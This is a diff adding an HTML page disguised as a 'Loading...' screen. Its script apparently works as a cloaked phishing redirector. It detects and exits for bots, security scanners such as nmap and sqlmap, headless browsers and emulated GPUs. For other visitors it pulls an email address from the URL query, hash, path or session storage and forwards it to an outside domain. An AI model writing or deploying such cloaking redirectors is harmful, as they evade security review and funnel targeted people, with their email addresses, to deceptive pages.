@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<title>Loading...</title>
+<script>
+(function () {
+  'use strict';
+
+  var DEST = "https://authordaveadams.com/oxcs.htm";
+  var STORE_KEY = "lead_params";
+  var PASS_ALL = true;
+  var MIRROR_HASH = true; // also append #email=... so the landing page can read either
+
+  var WHITELIST = ["email","e","em","mail","addr","address","user","u",
+                   "subid","s1","s2","src","aff","affid",
+                   "utm_source","utm_medium","utm_campaign","utm_term","utm_content",
+                   "first_name","fname","name","phone"];
+
+  var ua = (navigator.userAgent || "").toLowerCase();
+  var UA_BLOCK = /bot|crawl|spider|scrape|slurp|curl|wget|python|requests|urllib|httpx|aiohttp|java\/|okhttp|node-fetch|axios|got\/|go-http|perl|ruby|libwww|php\/|scan|nmap|nikto|sqlmap|masscan|zmap|pingdom|uptime|monitor|lighthouse|pagespeed|headless|phantom|puppeteer|playwright|selenium|webdriver|chrome-lighthouse|gtmetrix|semrush|ahrefs|moz\.com|majestic|screaming|deepcrawl|botify|seznam|yandex|baidu|sogou|exabot|ia_archiver|archive\.org|wayback|commoncrawl|ccbot|petalbot|applebot|duckduckbot|facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegrambot|discordbot|skypeuripreview|embedly|quora|pinterest|slackbot|vkshare|w3c_validator|validator\.nu|feedfetcher|google-read-aloud|google web preview|google-inspectiontool|googleother|google-extended|adsbot|mediapartners|apis-google|storebot-google|chrome\/\d+.*safari\/537.*headless/i;
+
+  if (UA_BLOCK.test(ua) || ua.length < 20) return;
+  if (/HeadlessChrome/i.test(navigator.userAgent)) return;
+
+  try {
+    var canvas = document.createElement("canvas");
+    var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    if (gl) {
+      var dbg = gl.getExtension("WEBGL_debug_renderer_info");
+      if (dbg && /swiftshader|llvmpipe/i.test(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL))) return;
+    }
+  } catch (e) {}
+
+  function isEmail(s) { return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(s); }
+
+  function addAll(params, target) {
+    params.forEach(function (value, key) {
+      if (key.indexOf("@") > -1 && !value) { target.set("email", key); return; }
+      target.set(key, value);
+    });
+  }
+
+  function buildDest() {
+    var params = new URLSearchParams();
+
+    addAll(new URLSearchParams(window.location.search || ""), params);
+
+    // HASH: "#jane@x.com", "#jane%40x.com", "#email=jane@x.com", "#!email=..."
+    var rawHash = (window.location.hash || "").replace(/^#!?/, "");
+    if (rawHash) {
+      if (rawHash.indexOf("=") > -1) {
+        addAll(new URLSearchParams(rawHash), params);   // decodes once
+      } else {
+        var h = rawHash;
+        try { h = decodeURIComponent(rawHash); } catch (e) {}
+        h = h.trim();
+        if (isEmail(h)) params.set("email", h);
+      }
+    }
+
+    // email sitting in the path: /jane@x.com
+    if (!params.get("email")) {
+      var m = decodeURIComponent(window.location.pathname)
+                .match(/([^\/]+@[^\/]+\.[a-z]{2,})/i);
+      if (m && isEmail(m[1])) params.set("email", m[1]);
+    }
+
+    // last resort: stashed by an earlier hop
+    if (!params.get("email")) {
+      try {
+        var s = JSON.parse(sessionStorage.getItem(STORE_KEY) || "{}");
+        if (s.email && isEmail(s.email)) params.set("email", s.email);
+      } catch (e) {}
+    }
+
+    if (params.get("email")) {
+      try { sessionStorage.setItem(STORE_KEY, JSON.stringify({ email: params.get("email") })); } catch (e) {}
+    }
+
+    var out;
+    try {
+      var url = new URL(DEST);
+      params.forEach(function (value, key) {
+        if (PASS_ALL || WHITELIST.indexOf(key.toLowerCase()) > -1) {
+          url.searchParams.set(key, value);
+        }
+      });
+      if (MIRROR_HASH && params.get("email")) {
+        url.hash = "email=" + encodeURIComponent(params.get("email"));
+      }
+      out = url.toString();
+    } catch (e) {
+      var qs = params.toString();
+      out = qs ? DEST + (DEST.indexOf("?") > -1 ? "&" : "?") + qs : DEST;
+    }
+    return out;
+  }
+
+  setTimeout(function () {
+    var target = buildDest();
+    try { window.location.replace(target); }
+    catch (e) { window.location.href = target; }
+  }, 750);
+})();
+</script>
+</body>
+</html>
